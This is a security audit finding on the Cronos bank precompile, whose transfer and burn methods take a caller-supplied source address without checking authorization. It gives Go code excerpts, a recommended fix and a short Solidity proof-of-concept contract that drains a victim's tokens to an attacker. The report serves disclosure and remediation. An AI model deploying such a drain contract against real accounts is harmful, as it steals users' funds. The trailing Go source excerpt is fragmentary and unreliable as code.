### Title
Bank Precompile `transfer` Executes Unauthorized Token Transfers from Arbitrary Sender Addresses — (`x/cronos/keeper/precompiles/bank.go`)

---

### Summary

The `BankContract.Run` handler for the `transfer` method accepts a caller-supplied `sender` address and moves `evm/<caller>` native tokens from that address without any authorization check. Any EVM contract can drain `evm/<itself>` native-bank tokens from any account that holds them, without the account holder's consent.

---

### Finding Description

The bank precompile exposes three state-mutating methods: `mint`, `burn`, and `transfer`. For all three, the denomination is correctly scoped to the calling contract:

```go
denom := EVMDenom(contract.Caller())   // "evm/0x<caller>"
```

This means a contract can only affect tokens of its own denom — the outer guard is present.

However, for `transfer`, the **source address** is taken verbatim from the ABI-decoded input:

```go
sender    := args[0].(common.Address)   // attacker-controlled
recipient := args[1].(common.Address)
amount    := args[2].(*big.Int)
...
from := sdk.AccAddress(sender.Bytes())
to   := sdk.AccAddress(recipient.Bytes())
...
bc.bankKeeper.SendCoins(ctx, from, to, sdk.NewCoins(amt))
```

There is **no check** that `sender == contract.Caller()`, nor any allowance/approval mechanism. The precompile calls `bankKeeper.SendCoins` directly with the attacker-supplied `from` address.

The same pattern applies to `burn`: the address to burn from (`recipient` in the variable name, but semantically the *source*) is taken from input args with no authorization check:

```go
recipient := args[0].(common.Address)   // attacker-controlled
...
bc.bankKeeper.SendCoinsFromAccountToModule(ctx, addr, types.ModuleName, sdk.NewCoins(amt))
bc.bankKeeper.BurnCoins(ctx, types.ModuleName, sdk.NewCoins(amt))
``` [1](#0-0) [2](#0-1) 

Compare this with the relayer precompile's `exec` helper, which **does** enforce that the signer embedded in the protobuf message matches `contract.Caller()`:

```go
caller := common.BytesToAddress(signers[0])
if caller != e.caller {
    return nil, fmt.Errorf("caller is not authenticated: ...")
}
``` [3](#0-2) 

The bank precompile has no equivalent guard.

---

### Impact Explanation

**Critical — Unauthorized transfer and burn of precompile-controlled assets.**

A malicious EVM contract can:

1. Call `bank.transfer(victim, attacker, X)` — moves `evm/<malicious_contract>` native tokens from `victim` to `attacker` with no consent from `victim`.
2. Call `bank.burn(victim, X)` — destroys `evm/<malicious_contract>` native tokens held by `victim` with no consent.

Any account that holds `evm/<malicious_contract>` native tokens is fully exposed. This matches the Critical impact category: *unauthorized transfer/burn of precompile-controlled assets*.

---

### Likelihood Explanation

For the attack to succeed, the victim must hold `evm/<attacker_contract>` native tokens. This is realistic in the following scenarios:

- A contract that appears legitimate accumulates users who call `moveToNative` (or equivalent), placing their tokens in native bank form, then the operator drains them.
- A legitimate CRC20 contract at `0xLegit` exposes a `transferNative(from, to, amount)` function that forwards arguments to the bank precompile without its own authorization check; an attacker calls it with `from = victim` to steal `evm/0xLegit` tokens.
- IBC-received tokens that auto-convert to `evm/<contract>` form leave balances in native bank state that are vulnerable.

---

### Recommendation

Add an authorization check in the `transfer` handler to ensure the `sender` matches `contract.Caller()`, mirroring the pattern used in the relayer precompile's `exec` helper:

```go
// In the TransferMethodName case:
if sender != contract.Caller() {
    return nil, errors.New("sender is not authenticated: transfer source must be the calling contract")
}
```

Similarly, for `burn`, verify that the address being burned from is `contract.Caller()` (or implement an explicit allowance mechanism if third-party burns are intentional):

```go
// In the BurnMethodName case:
if recipient != contract.Caller() {
    return nil, errors.New("burn target must be the calling contract")
}
``` [4](#0-3)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBankPrecompile {
    function transfer(address sender, address recipient, uint256 amount) external returns (bool);
    function burn(address recipient, uint256 amount) external returns (bool);
}

contract MaliciousToken {
    IBankPrecompile constant BANK = IBankPrecompile(address(0x64)); // 0x0000...0064

    // Step 1: lure victim into holding evm/<this> native tokens via moveToNative
    // Step 2: call this to drain them
    function drain(address victim, address attacker, uint256 amount) external {
        // denom = "evm/<address(this)>" — scoped to this contract, no other check
        BANK.transfer(victim, attacker, amount);
        // OR: BANK.burn(victim, amount) to destroy victim's balance
    }
}
```

**Attack flow:**

1. Attacker deploys `MaliciousToken` at `0xMalicious`.
2. Victim acquires `evm/0xMalicious` native tokens (e.g., via `moveToNative` on the contract).
3. Attacker calls `MaliciousToken.drain(victim, attacker, victimBalance)`.
4. `bank.transfer(victim, attacker, victimBalance)` executes — `denom = evm/0xMalicious`, `from = victim`, `to = attacker` — with no authorization check on `victim`.
5. Victim's entire `evm/0xMalicious` native balance is transferred to the attacker.

	// parse input
	methodID := contract.Input[:4]
	method, err := bankABI.MethodById(methodID)
	if err != nil {
		return nil, err
	}
	stateDB := evm.StateDB.(ExtStateDB)
	precompileAddr := bc.Address()
	switch method.Name {
	case MintMethodName, BurnMethodName:
		if readonly {
			return nil, errors.New("the method is not readonly")
		}
		args, err := method.Inputs.Unpack(contract.Input[4:])
		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		recipient := args[0].(common.Address)
		amount := args[1].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		addr := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(addr); err != nil {
			return nil, err
		}
		denom := EVMDenom(contract.Caller())

				return err

			if method.Name == "mint" {

					return errorsmod.Wrap(err, "fail to mint coins in precompiled contract")

					return errorsmod.Wrap(err, "fail to burn coins in precompiled contract")

			}

			return nil, err
		}

		}

		if err != nil {
			return nil, errors.New("fail to unpack input arguments")
		}
		sender := args[0].(common.Address)
		recipient := args[1].(common.Address)
		amount := args[2].(*big.Int)
		if amount.Sign() <= 0 {
			return nil, errors.New("invalid amount")
		}
		from := sdk.AccAddress(sender.Bytes())
		to := sdk.AccAddress(recipient.Bytes())
		if err := bc.checkBlockedAddr(to); err != nil {
			return nil, err
		}
